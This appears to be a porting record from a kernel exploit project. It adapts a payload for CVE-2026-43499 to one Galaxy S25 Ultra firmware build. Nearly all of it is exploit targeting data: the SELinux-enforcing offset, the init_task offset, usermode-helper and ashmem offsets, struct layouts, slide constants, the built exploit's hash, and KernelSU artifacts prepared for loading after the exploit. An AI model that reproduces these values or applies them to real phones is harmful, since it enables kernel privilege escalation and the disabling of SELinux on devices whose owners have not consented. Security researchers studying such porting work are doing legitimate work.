# SM-S938U1 / S938U1UEUCDZIF porting record

Offline port of the Galaxy S25 Ultra US unlocked firmware
`S938U1UEUCDZIF` (XAA) to the pa3q CVE-2026-43499 payload. Values from
another device or firmware must not be reused. Every offset below was
re-derived from this exact build; nothing was copied from the ACZF1 record
except the two platform constants explicitly marked as carried.

## Firmware identity

| Field | Verified value |
| --- | --- |
| Package model | `SM-S938U1` |
| Region | `XAA` |
| AP/PDA package | `S938U1UEUCDZIF` |
| Internal AP/kernel build | `S938USQUCDZIF` |
| Device codename | `pa3q` |
| Kernel release | `6.6.127-android15-8-p33f4ffe-abogkiS938USQUCDZIF-4k` |
| Kernel page size | 4096 (`-4k` variant) |

## Verified chain

| Object | Size (bytes) | SHA-256 |
| --- | ---: | --- |
| Firmware package `S938U1UEUCDZIF_XAA.zip` | 18,843,742,959 | `7FCBB708E65AB6B773A89DF5D257CA825DE521B3835579A688B104000101DA9C` |
| Decompressed `boot.img` | 101,122,048 | `37F959EFEA7C7FBCABB2642C9E6B1935ED40575F883D667FF55726471E4205C4` |
| Raw kernel payload | 39,115,264 | `9D1CA0F850387E2A223726431A27373482A8F8CE89369D22A2E6C4F62F8A6CA1` |
| `vendor_boot.img` | 134,217,728 | (not hashed) |
| `abl.elf` | 2,470,200 | (not hashed) |

ARM64 Image header: `text_offset = 0`, `image_size = 0x27f0000`,
`flags = 0xa`, magic `ARMd`.

## Symbol and BTF extraction

`vmlinux-to-elf` recovered the symbolized ELF with base
`0xffffffc080000000` (kallsyms first-symbol fallback heuristic). The raw BTF
blob validated at `[0x18aca6c, 0x1ecd673)` (6,425,607 bytes).

All required symbols were recovered; per-build offsets (relative to
`KIMAGE_TEXT_BASE`):

| Use | Symbol | Offset |
| --- | --- | ---: |
| usermode-helper worker | `call_usermodehelper_exec_work` | `0x000d1278` |
| no-op seek | `noop_llseek` | `0x003cb7f8` |
| splice read | `copy_splice_read` | `0x004190cc` |
| configfs read | `configfs_read_iter` | `0x004983d4` |
| configfs binary write | `configfs_bin_write_iter` | `0x00498900` |
| ashmem ioctl | `ashmem_ioctl` | `0x00d7e6c0` |
| ashmem compat ioctl | `compat_ashmem_ioctl` | `0x00d7ed7c` |
| ashmem mmap | `ashmem_mmap` | `0x00d7edd0` |
| ashmem open | `ashmem_open` | `0x00d7eff0` |
| ashmem release | `ashmem_release` | `0x00d7f078` |
| ashmem fdinfo | `ashmem_show_fdinfo` | `0x00d7f104` |
| anonymous pipe operations | `anon_pipe_buf_ops` | `0x01278148` |
| ashmem operations | `ashmem_fops` | `0x01437480` |
| allocator caches | `kmalloc_caches` | `0x0180e578` |
| `"nfnetlink_log"` string | `nfulnl_logger.name` target | `0x017915ee` |
| unbound workqueue | `system_unbound_wq` | `0x0233ac60` |
| netfilter logger object | `nfulnl_logger` | `0x02342080` |
| logger array (cross-check) | `loggers` | `0x02341fc8` |
| initial task | `init_task` | `0x0234e2c0` |
| root task group | `root_task_group` | `0x0255df80` |
| SELinux enforcing | `selinux_state.enforcing` | `0x025a0810` |
| ashmem misc fops | `ashmem_misc + 0x10` | `0x024bcd80` |
| boot-ID sysctl storage | `sysctl_bootid` | `0x02683910` |
| boot-ID ctl-table data pointer | unique `&sysctl_bootid` qword | `0x024785c8` |

The `random_table[]` entry's writable `.data` pointer was located by the
exact-qword search (single hit), with the `boot_id` procname pointer
verified in the preceding qword of the enclosing ctl-table entry.

## Physical load addresses

All 19 vendor_boot DTBs carry
`/reserved-memory/gunyah_hyp_region@80000000`, fixing the lowest RAM base at
`0x80000000` (identical to the S928 anchor):

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
```

`P0_KERNEL_PHYS_LOAD` carries the S25U platform load constant from the
ACZF1 record: the DTB anchor is byte-identical between the two builds and
the ABL lineage is unchanged. Hardware validation on this exact firmware
has not been performed yet.

## Slide data

- `SLIDE_TRACEFS_WORKER_CALLER_OFF`: disassembly of `worker_thread`
  (`0xffffffc0800d9b04`, size 0x334) shows exactly one blocking
  `bl schedule` at `0xffffffc0800d9b9c`; the saved wchan address is the
  following instruction, giving `0x000d9ba0`.
- `SLIDE_TRACEFS_EVENT_ID`: not part of the pa3q app payload (no tracefs
  path). For reference: `__event_sched_blocked_reason - __start_ftrace_events`
  = `0x2c8` = 89 entries, `__TRACE_LAST_TYPE = 21` (BTF), so the runtime
  event ID would be `110`.
- `SLIDE_PSELECT_WORD_SHIFT = 0` carries from the ACZF1 record; the
  fs/select.c syscall stack layout of the same 6.6 lineage is unchanged
  (core_sys_select present, syscall wrapper structure intact).
- `SKB_DATA_DELTA = -0xe80`: BTF gives `sizeof(struct skb_shared_info) ==
  360`; `SKB_DATA_ALIGN(360) = 384` (L1_CACHE_BYTES 64), so
  `SKB_MAX_HEAD(0) = 4096 - 384 = 0xe80` — identical to the ACZF1 value.

BTF layout cross-check against the ACZF1 target header — every shared
constant matched byte-for-byte:

```text
file_operations: ioctl 0x48; compat_ioctl 0x50; mmap 0x58; open 0x68;
  release 0x78; splice_read 0xb8; show_fdinfo 0xd8 (size 0x108)
task_struct: usage 0x40; prio 0x84; normal_prio 0x8c; sched_task_group 0x348;
  pi_lock 0x90c; pi_waiters 0x920; pi_top_task 0x930; pi_blocked_on 0x938
rt_mutex_waiter: task 0x50; lock 0x58; wake_state 0x60; ww_ctx 0x68 (size 0x70)
  rt_waiter_node: entry 0x00; prio 0x18; deadline 0x20
configfs_buffer: page 0x10; needs_read_fill 0x50; bin_buffer 0x58;
  bin_buffer_size 0x60; cb_max_size 0x64
pool_workqueue: pool 0x00; wq 0x08; work_color 0x10; refcnt 0x18;
  nr_active 0x5c; max_active 0x60
worker_pool: worklist 0x28; nr_idle 0x3c; work_struct: data 0x00;
  entry 0x08; func 0x18
page: size 0x40; miscdevice.fops 0x10; pipe_buffer.ops 0x10
```

`tools/generate_p0_fingerprint` produced all 32 candidate rows from the raw
kernel Image at probe `0x1f0000` and independently read back all 256 source
qwords at offsets `0x000` through `0xe00`.

## Payload build

The release target builds at 92,248 bytes and is padded to the fixed
104,128-byte release size:

```text
artifacts/pa3q-S938USQUCDZIF/cve-2026-43499-app.so
size 104128
SHA-256 fcd1f5fb4fabba34f9bd740882be001a2edf61aa9bdfbe91f25d6cc2f5c77dc1
```

## KernelSU late-load artifacts

KernelSU `v3.2.5` (commit `b0bc817b4e966aa6aa830834eaf6ef765d821d40`) with
the Samsung KDP/RKP/DEFEX patch, built in the DDK image
`ghcr.io/ylarod/ddk-min:android15-6.6-20260828` whose tree is the matching
6.6.127-4k KMI build, with `UTS_RELEASE`/`kernel.release` replaced by the
exact target release. Module flags:
`CONFIG_KSU=m CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y
CONFIG_KSU_SAMSUNG_DEFEX=y`, fallback version 32525.

The module reports:

```text
vermagic: 6.6.127-android15-8-p33f4ffe-abogkiS938USQUCDZIF-4k SMP preempt mod_unload modversions aarch64
```

Static audits against the recovered target `vmlinux.elf`:

```text
check_symbol: exit 0 (no missing symbols)
undefined symbols: 221
module version entries: 0
missing from target symbol table: 0
symbols resolved from kallsyms rather than target exports: 58
target CRC mismatches: 0
```

## Hardware validation

**PENDING.** The offline gates above are complete; execution on an
SM-S938U1 running exact firmware `S938U1UEUCDZIF` has not been attempted.
Per the repository policy, hardware execution is a separate validation
step and must be performed only on devices you own or are authorized to
test.
